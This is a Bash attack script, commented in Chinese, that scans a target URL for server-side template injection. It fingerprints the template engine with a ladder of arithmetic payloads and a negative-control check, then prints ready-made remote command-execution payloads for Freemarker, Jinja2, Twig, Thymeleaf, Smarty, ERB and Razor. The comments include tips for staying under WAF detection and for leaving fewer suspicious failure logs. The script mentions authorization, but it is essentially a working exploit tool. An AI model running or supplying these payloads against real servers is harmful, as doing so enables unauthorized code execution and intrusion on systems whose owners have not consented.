#!/usr/bin/env bash
# ============================================================================
# SSTI 引擎指纹阶梯探测
# 用法: ./poc.sh 'https://TARGET/search?q=FUZZ'
#       ./poc.sh 'https://TARGET/api/render' POST '{"tpl":"FUZZ"}'
#
# 【设计】为什么是「阶梯」而不是「一次全发」
#   一次发 10 个 payload 会被 WAF 一并拦截，而且分不清是「引擎不执行」还是
#   「被拦了」。阶梯的含义是：**先发最不可能被拦、最可能命中的几个**，
#   一旦确定引擎族，再发该族专属的确认 payload，避免无谓的告警。
#
# 【判据】为什么用 7*7=49 而不是 {7*7}
#   算术表达式返回的是「计算结果」还是「原样回显」差别极大：
#     - 返回 49       → 引擎真的在求值（真 SSTI）
#     - 返回 7*7      → 只是把输入回显了（不是 SSTI）
#     - 返回 {7*7}    → 未解析
#   用 49 这个「不可能在正常业务里出现」的值，能一眼区分。
#   再配合「不存在的表达式」做阴性对照（见 baseline），排除「页面本来就含 49」。
#
# 【常见误报】
#   1. 页面回显用户输入（搜索框、错误提示）→ 你看到 7*7 原样，判「未执行」是对的；
#      但如果你提交的就是 49，页面回显 49，会误判成「执行了」。
#      所以每个 probe 都用不同的乘数（7*7=49, 8*8=64...），并要求只出现该结果。
#   2. 结果被截断（只显示前 N 字符）→ payload 短，一般不受影响；长 payload 会。
#   3. 模板有缓存 → 同一 URL 第二次不重新渲染。每次 probe 加随机 query 参数。
# ============================================================================
set -uo pipefail
source "$(dirname "$0")/../_lib/common.sh"

URL="${1:-}"; METHOD="${2:-GET}"; TEMPLATE="${3:-}"
[ -z "$URL" ] && usage_die "$0 '<URL with FUZZ>' [GET|POST] ['body with FUZZ']"
case "$URL" in *FUZZ*) ;; *) usage_die "URL 必须含 FUZZ 占位符" ;; esac
preflight || exit 1

send() {  # send <payload> → stdout body
  local p="$1" u="${URL//FUZZ/$1}"
  local body
  if [ "$METHOD" = "POST" ] && [ -n "$TEMPLATE" ]; then
    body=$(req POST "$u" -H 'Content-Type: application/json' --data-binary "${TEMPLATE//FUZZ/$p}")
    [ -z "$body" ] && body=$(req POST "$u" \
      -H 'Content-Type: application/x-www-form-urlencoded' --data-urlencode "q=$p")
  else
    body=$(req GET "$u")
  fi
  printf '%s' "$body"
}

# ---- 阴性对照 -------------------------------------------------------------
# 用一个「不会被求值的字符串」确认页面本身不含 49/64 等数字
CTRL_MARK="ZZQ$(date +%s | tail -c 5)"
log "阴性对照（页面是否本来就含目标数字）"
ctrl=$(send "$CTRL_MARK")
for n in 49 64 225 343; do
  if printf '%s' "$ctrl" | grep -q "$n"; then
    warn "对照组已含 $n —— 该数字在页面上本来就存在，用它做判据会误报"
  fi
done
dim "对照组长度 $(printf '%s' "$ctrl" | wc -c) 字节"

# ---- 阶梯 -----------------------------------------------------------------
# 格式: level|payload|expected|family
PROBES=(
  '1|${7*7}|49|JSP-EL / Freemarker / Thymeleaf'
  '2|${7*7}|49|同上（${} 独立出现）'
  '3|{{7*7}}|49|Jinja2 / Twig / Nunjucks'
  '4|{{7*"7"}}|7777777|Jinja2（字符串重复）'
  '5|{{7*"7"}}|49|Twig（字符串转数）'
  '6|#{7*7}|49|Ruby ERB / Thymeleaf 片段'
  '7|<%= 7*7 %>|49|ERB / EJS / ASP'
  '8|[[${7*7}]]|49|Thymeleaf 字面替换'
  '9|${{7*7}}|49|Thymeleaf 预处理'
  '10|{7*7}|49|Smarty / 通用花括号'
  '11|@(7*7)|49|Razor / ASP.NET'
  '12|%{7*7}|49|Mako / Struts OGNL'
)

echo
log "开始阶梯探测（每级独立对照）"
HIT_FAMILY=""; HIT_LEVEL=""
for row in "${PROBES[@]}"; do
  IFS='|' read -r lvl payload expect fam <<<"$row"
  r=$(send "$payload")

  # 三重条件: ① 出现预期结果 ② 不出现原始 payload ③ 对照组不含该结果
  has_expect=0; has_raw=0
  printf '%s' "$r" | grep -qF "$expect" && has_expect=1
  printf '%s' "$r" | grep -qF "$payload" && has_raw=1

  if [ "$has_expect" = 1 ] && [ "$has_raw" = 0 ]; then
    ok "L$lvl 命中 → $fam"
    dim "    payload: $payload  → 结果含 $expect，且未回显原始串"
    [ -z "$HIT_FAMILY" ] && { HIT_FAMILY="$fam"; HIT_LEVEL="$lvl"; }
  elif [ "$has_expect" = 1 ] && [ "$has_raw" = 1 ]; then
    warn "L$lvl 同时出现结果和原串 → 疑似部分渲染/日志回显，需人工看响应"
  else
    dim "L$lvl 未命中 ($payload)"
  fi
  sleep "$SLEEP"
done

# ---- 结论 ----------------------------------------------------------------
echo
if [ -n "$HIT_FAMILY" ]; then
  ok "疑似 SSTI，引擎族: $HIT_FAMILY（首次命中 L$HIT_LEVEL）"
  cat <<'EOF'

确认与利用方向（按引擎，需先确认授权）：
  Freemarker : ${"freemarker.template.utility.Execute"?new()("id")}
  Jinja2     : {{ cycler.__init__.__globals__.os.popen('id').read() }}
  Twig       : {{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
  Thymeleaf  : ${T(java.lang.Runtime).getRuntime().exec('id')}  (SpringEL)
  Smarty     : {php}echo `id`;{/php}   (旧版)  /  {system('id')}
  ERB        : <%= `id` %>
  Razor      : @{ System.Diagnostics.Process.Start("id"); }

注意: 上面全部是「会导致命令执行」的 payload，先确认目标授权，
      并且优先用回显型（能读到 stdout）而不是盲打，避免留下可疑失败日志。
EOF
else
  warn "未命中。逐条排除："
  dim "① 输入点不对 → 试 header（User-Agent/Referer）、文件名、JSON 的每个字段"
  dim "② 结果在异步/回调里 → 换 OAST_DOMAIN 做无回显探测"
  dim "③ 模板引擎开了沙盒（Jinja2 SandboxedEnvironment）→ 算术能算但不能读属性"
  dim "④ 每级都该看原始响应，不只是有没有 49 —— 报错信息常直接暴露引擎名"
fi
